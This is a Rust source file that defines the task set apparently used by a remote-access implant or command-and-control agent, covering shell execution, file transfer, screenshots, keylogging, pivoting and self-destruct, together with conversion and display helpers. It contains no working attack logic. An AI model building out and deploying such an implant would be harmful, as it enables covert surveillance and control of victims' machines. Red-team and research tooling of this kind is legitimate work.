use std::fmt;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TaskType {
    ShellExec = 0,
    FileUpload = 1,
    FileDownload = 2,
    ProcessList = 3,
    Screenshot = 4,
    KeylogStart = 5,
    KeylogStop = 6,
    PivotSetup = 7,
    SelfDestruct = 99,
}

impl TaskType {
    pub fn from_i32(value: i32) -> Option<Self> {
        match value {
            0 => Some(Self::ShellExec),
            1 => Some(Self::FileUpload),
            2 => Some(Self::FileDownload),
            3 => Some(Self::ProcessList),
            4 => Some(Self::Screenshot),
            5 => Some(Self::KeylogStart),
            6 => Some(Self::KeylogStop),
            7 => Some(Self::PivotSetup),
            99 => Some(Self::SelfDestruct),
            _ => None,
        }
    }
    
    pub fn requires_response(&self) -> bool {
        !matches!(self, Self::KeylogStart | Self::SelfDestruct)
    }
    
    pub fn is_dangerous(&self) -> bool {
        matches!(self, Self::SelfDestruct | Self::ShellExec)
    }
}

impl fmt::Display for TaskType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        let s = match self {
            Self::ShellExec => "shell_exec",
            Self::FileUpload => "file_upload",
            Self::FileDownload => "file_download",
            Self::ProcessList => "process_list",
            Self::Screenshot => "screenshot",
            Self::KeylogStart => "keylog_start",
            Self::KeylogStop => "keylog_stop",
            Self::PivotSetup => "pivot_setup",
            Self::SelfDestruct => "self_destruct",
        };
        write!(f, "{}", s)
    }
}